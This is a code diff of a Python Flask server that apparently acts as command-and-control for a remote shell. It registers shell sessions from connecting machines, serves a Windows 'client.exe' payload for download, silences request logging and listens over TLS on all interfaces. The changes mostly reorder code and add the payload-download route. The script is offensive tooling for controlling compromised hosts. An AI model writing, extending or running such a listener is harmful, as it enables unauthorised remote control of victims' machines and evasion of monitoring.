@@ -1,50 +1,33 @@
 #!/usr/bin/env python3
-
+import logging
 from threading import Thread
+from time import gmtime, strftime
+from uuid import uuid1
 
-from flask import Flask
+from flask import Flask, jsonify, request, send_file
 
 app = Flask(__name__)
-
-from uuid import uuid1
-from flask import jsonify, request
-
-shells_filename = 'shells.txt'
+logging.getLogger('werkzeug').disabled = True
 
 prompt_prefix = ''
+current_user = ''
+current_dir = ''
+
+DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
+DEFAULT_PORT = 8443
+DEFAULT_SSL_FLAG = True
+
+shells_filename = 'shells.txt'
+client_win32_executable_file = './dist/client.exe'
 
 
-def read_stored_shells():
-    with open(shells_filename, 'r', encoding='utf-8') as file:
-        return [line.strip() for line in file.readlines()]
-
-
-def write_shell(shell_id, remote_addr):
-    with open(shells_filename, 'a', encoding='utf-8') as file:
-        file.write(shell_id)
-        file.write('\n')
-        print('New command session opened: {remote_addr} '.format(remote_addr=remote_addr))
-        return shell_id
-
-
-@app.route('/')
-@app.route('/index')
-def index():
-    return "Fuck off, nothing to see here"
-
-
-def unauthorized():
-    response = jsonify({
-        'message': 'A winner isn\'t you'
-    })
-    return response, 401
-
-
-def forbidden():
-    response = jsonify({
-        'message': 'The boss is busy'
-    })
-    return response, 403
+@app.route('/client.exe')
+def client_win32():
+    if current_dir and current_user:
+        return forbidden()
+    print("{remote_addr} - downloading a win32 client executable"
+          .format(remote_addr=request.remote_addr))
+    return send_file(client_win32_executable_file)
 
 
 @app.route('/init')
@@ -53,10 +36,6 @@ def init_shell():
         return forbidden()
     shell_id = write_shell(str(uuid1()), request.remote_addr)
     return jsonify(shell_id)
-
-
-current_user = ''
-current_dir = ''
 
 
 @app.route('/<shell_id>', methods=["POST", "GET"])
@@ -102,6 +81,33 @@ def listen(shell_id):
     return jsonify("ok thanks")
 
 
+def unauthorized():
+    response = jsonify({
+        'message': 'A winner isn\'t you'
+    })
+    return response, 401
+
+
+def forbidden():
+    response = jsonify({
+        'message': 'The boss is busy'
+    })
+    return response, 403
+
+
+def read_stored_shells():
+    with open(shells_filename, 'r', encoding='utf-8') as file:
+        return [line.strip() for line in file.readlines()]
+
+
+def write_shell(shell_id, remote_addr):
+    with open(shells_filename, 'a', encoding='utf-8') as file:
+        file.write(shell_id)
+        file.write('\n')
+        print('New command session opened: {remote_addr} '.format(remote_addr=remote_addr))
+        return shell_id
+
+
 class FlaskThread():
     def __init__(self, app, ip, ssl=False, port=80):
         assert app
@@ -119,11 +125,6 @@ class FlaskThread():
             self.app.run(host=self.ip, port=self.port, ssl_context='adhoc')
         else:
             self.app.run(host=self.ip, port=self.port)
-
-
-DEFAULT_IP_BIND_ADDRESS = '0.0.0.0'
-DEFAULT_PORT = 443
-DEFAULT_SSL_FLAG = True
 
 
 def get_arguments():
@@ -152,15 +153,6 @@ def get_arguments():
 
 options = get_arguments()
 
-import logging
-from time import gmtime, strftime
-
-logging.getLogger('werkzeug').disabled = True
-
-
-def current_date_time():
-    return strftime("%Y-%m-%d %H:%M:%S", gmtime())
-
 
 def serve_forever():
     while True:
@@ -172,5 +164,6 @@ if __name__ == "__main__":
                                port=options.port,
                                ssl=options.ssl)
     flask_thread.start()
-    print('[{now}] Listening for connections...\r'.format(now=current_date_time()), end='', flush=True)
+    print('[{now}] Listening for connections...\r'.format(now=strftime("%Y-%m-%d %H:%M:%S", gmtime())), end='',
+          flush=True)
     serve_forever()
